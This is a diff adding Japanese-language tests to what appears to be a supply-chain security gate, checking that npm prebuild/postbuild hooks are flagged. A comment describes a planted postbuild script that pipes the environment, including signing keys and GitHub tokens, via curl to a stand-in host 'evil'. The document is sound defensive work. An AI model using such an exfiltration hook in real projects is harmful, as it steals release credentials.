@@ -90,3 +90,50 @@ describe('npm ci の時点で走るコードは門の中に在る (パス 371)',
     expect(gate.presentInstallConfigs(), 'インストール時設定が増えた — 台帳に理由を書くこと').toEqual([]);
   });
 });
+
+/**
+ * **`npm run build` の自動発火フック (prebuild / postbuild) も門の中に在る** (2026-10-13 · パス 514 · T-016)。
+ *
+ * ## 見つけた物 (実測)
+ *
+ * install フック (preinstall/postinstall/…) は規則 8 が覆っていたが、`LIFECYCLE_KEYS` に
+ * `prebuild` / `postbuild` が無かった。`npm run build` は prebuild → build → postbuild の順で走り、
+ * `release.yml` の **Build** ステップ (`npm run build -- --publish never`) は署名鍵
+ * (CSC_LINK / CSC_KEY_PASSWORD / Apple 資格情報 / GH_TOKEN) を env に持つ。install フックと違い
+ * `npm ci` では発火しないので ci.yml (build:web だけ) では一度も走らず、release タグを切った瞬間に
+ * だけ走る —— PR の CI は緑のまま。
+ *
+ * 対照 (2026-10-13 実測・直す前): リポジトリ直下に `postbuild.cjs`
+ * (`require('node:child_process').execSync('env | curl … https://evil/x')`) を置き、
+ * `package.json` に `"postbuild": "node postbuild.cjs"` を 1 行足すと ——
+ * lint:malware / lint:forbidden / lint:network-targets / lint:deps の **4 門すべて exit 0**
+ * (lint:network-targets は fetch 一族しか見ず child_process/curl は対象外・lint:malware と
+ * lint:forbidden は直下を走査しない・lint:deps 規則 8 は postbuild を見ない)。
+ * この狩りで 3 門を直した: lint:deps 規則 8 が prebuild/postbuild を覆い (ここ)、
+ * lint:malware / lint:forbidden が追跡された直下の実行コードを走査する
+ * (malwareGate.test.ts / rootConfigScanned.test.ts)。
+ */
+describe('npm run build の自動発火フックも門の中に在る (パス 514 · T-016)', () => {
+  it('★ LIFECYCLE_KEYS は prebuild / postbuild を見る (threat: T-016)', () => {
+    expect(gate.LIFECYCLE_KEYS, 'postbuild を見ていない').toContain('postbuild');
+    expect(gate.LIFECYCLE_KEYS, 'prebuild を見ていない').toContain('prebuild');
+  });
+
+  it('★ 標本: postbuild を足すと鳴り、文面が build 時の発火と署名鍵を名乗る (threat: T-016)', () => {
+    const planted = { ...pkg, scripts: { ...pkg.scripts, postbuild: 'node postbuild.cjs' } };
+    const problems = gate.checkOwnLifecycle(planted);
+    expect(problems.length, 'postbuild を見逃している').toBe(1);
+    expect(problems[0], 'build 時の発火と署名鍵を名乗っていない').toContain('npm run build');
+    expect(problems[0]).toContain('署名鍵');
+  });
+
+  it('★ 標本: prebuild を足しても鳴る', () => {
+    const planted = { ...pkg, scripts: { ...pkg.scripts, prebuild: 'node x.cjs' } };
+    expect(gate.checkOwnLifecycle(planted).length, 'prebuild を見逃している').toBe(1);
+  });
+
+  it('★ 今日は prebuild / postbuild はどちらも無い (この検査が守っている事実)', () => {
+    expect(Object.hasOwn(pkg.scripts, 'prebuild'), 'prebuild が増えた — 台帳に理由を').toBe(false);
+    expect(Object.hasOwn(pkg.scripts, 'postbuild'), 'postbuild が増えた — 台帳に理由を').toBe(false);
+  });
+});
